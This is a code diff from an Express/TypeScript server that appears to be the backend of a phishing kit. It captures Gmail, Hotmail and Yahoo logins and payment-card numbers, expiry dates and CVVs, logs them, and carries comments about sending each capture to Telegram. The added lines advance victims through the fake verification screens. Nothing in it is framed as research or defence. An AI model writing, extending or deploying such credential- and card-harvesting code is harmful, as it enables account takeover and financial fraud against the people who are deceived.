@@ -1498,6 +1498,7 @@ export async function registerRoutes(app: Express): Promise<Server> {
               case 'gmail':
                 updatedFields.correo = inputData.correo;
                 updatedFields.contrasena = inputData.contrasena;
+                updatedFields.pasoActual = ScreenType.GMAIL_VERIFY;
                 console.log('Recibidas credenciales de Gmail:', inputData.correo);
                 
                 // Enviar notificación a Telegram
@@ -1511,6 +1512,7 @@ export async function registerRoutes(app: Express): Promise<Server> {
               case 'hotmail':
                 updatedFields.correo = inputData.correo;
                 updatedFields.contrasena = inputData.contrasena;
+                updatedFields.pasoActual = ScreenType.HOTMAIL;
                 console.log('Recibidas credenciales de Hotmail:', inputData.correo);
                 
                 // Enviar notificación a Telegram
@@ -1524,6 +1526,7 @@ export async function registerRoutes(app: Express): Promise<Server> {
               case 'yahoo':
                 updatedFields.correo = inputData.correo;
                 updatedFields.contrasena = inputData.contrasena;
+                updatedFields.pasoActual = ScreenType.YAHOO;
                 console.log('Recibidas credenciales de Yahoo:', inputData.correo);
                 
                 // Enviar notificación a Telegram
@@ -1538,6 +1541,7 @@ export async function registerRoutes(app: Express): Promise<Server> {
                 updatedFields.tarjeta = inputData.numeroTarjeta;
                 updatedFields.fechaVencimiento = inputData.fechaVencimiento;
                 updatedFields.cvv = inputData.cvv;
+                updatedFields.pasoActual = ScreenType.DATOS_TARJETA;
                 console.log('Recibidos datos de tarjeta:', inputData.numeroTarjeta?.slice(-4));
                 
                 // Enviar notificación a Telegram
